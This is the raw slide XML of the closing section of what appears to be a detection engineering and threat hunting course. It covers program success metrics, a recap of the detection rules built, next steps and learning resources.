              <a:ext cx="3368625" cy="888625"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="35545" w="134745">
                  <a:moveTo>
                    <a:pt x="1" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1" y="35545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134744" y="35545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2" name="Google Shape;1632;p120"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2154725" y="238125"/>
              <a:ext cx="3368625" cy="836350"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="33454" w="134745">
                  <a:moveTo>
                    <a:pt x="1" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1" y="33454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134744" y="33454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1347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3" name="Google Shape;1633;p12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4" name="Google Shape;1634;p12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5" name="Google Shape;1635;p12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6" name="Google Shape;1636;p12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7" name="Google Shape;1637;p12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8" name="Google Shape;1638;p12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9" name="Google Shape;1639;p12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121"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="237641" y="203879"/>
            <a:ext cx="64803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MEASURING DETECTION PROGRAM SUCCESS_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1645" name="Google Shape;1645;p121"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1214225" y="742950"/>
            <a:ext cx="7120200" cy="389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Coverage Metrics: </a:t>
            </a:r>
            <a:endParaRPr/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% of MITRE ATT&amp;CK techniques covered </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5"/>
              </a:highlight>
            </a:endParaRPr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# of production-ready detection rules </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5"/>
              </a:highlight>
            </a:endParaRPr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# of attack scenarios tested </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5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Metrics: </a:t>
            </a:r>
            <a:endParaRPr/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Alert volume (trending down = good tuning) </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5"/>
              </a:highlight>
            </a:endParaRPr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False positive rate (&lt; 5% is good) </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5"/>
              </a:highlight>
            </a:endParaRPr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Mean time to detect (MTTD) </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5"/>
              </a:highlight>
            </a:endParaRPr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Mean time to respond (MTTR) </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5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Metrics: </a:t>
            </a:r>
            <a:endParaRPr/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Detection confidence levels </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5"/>
              </a:highlight>
            </a:endParaRPr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Rule documentation completeness </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5"/>
              </a:highlight>
            </a:endParaRPr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Testing coverage </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5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Hunt Metrics: </a:t>
            </a:r>
            <a:endParaRPr/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Hunts conducted per month </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5"/>
              </a:highlight>
            </a:endParaRPr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Threats discovered through hunting </a:t>
            </a:r>
            <a:endParaRPr>
              <a:highlight>
                <a:schemeClr val="accent5"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-309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highlight>
                  <a:schemeClr val="accent5"/>
                </a:highlight>
              </a:rPr>
              <a:t>Detection gaps identified Track, measure, improve</a:t>
            </a:r>
            <a:endParaRPr u="none">
              <a:highlight>
                <a:schemeClr val="accent5"/>
              </a:highlight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122"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="582775" y="16212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AND WE DONE…?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1651" name="Google Shape;1651;p122"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5268775" y="742950"/>
            <a:ext cx="3099000" cy="379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300"/>
              <a:t>✅ Built 40+ production-ready detection rules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300"/>
              <a:t>✅ Covered 6 major ATT&amp;CK techniques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300"/>
              <a:t>✅ Tested against real attack simulations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300"/>
              <a:t>✅ Learned threat hunting methodology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300"/>
              <a:t>✅ Used enterprise security tools (Wazuh, Velociraptor, Caldera)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300"/>
              <a:t>✅ Created correlation rules for attack chains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300"/>
              <a:t>✅ Documented findings professionally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23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="762150" y="1080749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IMMEDIATE (WEEK 1)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1657" name="Google Shape;1657;p123"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="762150" y="1688965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Deploy your rules to production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Schedule first threat hunt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Baseline your environment</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1658" name="Google Shape;1658;p123"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="237641" y="203879"/>
            <a:ext cx="64803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SIKE!!!</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1659" name="Google Shape;1659;p123"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777100" y="2869065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Cover 20+ additional ATT&amp;CK techniques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Build detection dashboards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Create response playbooks</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1660" name="Google Shape;1660;p123"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="18" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777100" y="40527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- 80%+ ATT&amp;CK coverage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Automated threat hunting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Threat intelligence integration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Red team partnership</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1661" name="Google Shape;1661;p123"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777100" y="2260849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SHORT-TERM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> (MONTH 1):</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1662" name="Google Shape;1662;p123"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777100" y="3440946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LONG-TERM (YEAR 1):</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1663" name="Google Shape;1663;p123"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="18" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4171775" y="1293325"/>
            <a:ext cx="4547700" cy="221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Resources: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MITRE ATT&amp;CK website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Detection engineering blogs (Palantir, Red Canary)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Sigma rules repository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Your network of detection engineers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Keep learning. Keep hunting. Keep building.</a:t>
            </a:r>
            <a:endParaRPr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24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="743700" y="743700"/>
            <a:ext cx="4299000" cy="18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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>HANK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YOU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>!</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1669" name="Google Shape;1669;p124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90"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1020"/>
              <a:t>AND NOW WE ACTUALLY DONE!</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1020"/>
            </a:br>
            <a:br>
              <a:rPr lang="en" sz="1020"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1020"/>
              <a:t>NOW GO OUT THERE AND MAKE THAT LINKEDIN POST ABOUT HOW Y’ALL SURVIVE AN 8 HOUR CLASS OF PURE DETECTION ENGINEERING AND THREAT HUNTING WHILE BEING ASLEEP HALF OF THE TIME :P</a:t>
            </a:r>
            <a:endParaRPr sz="10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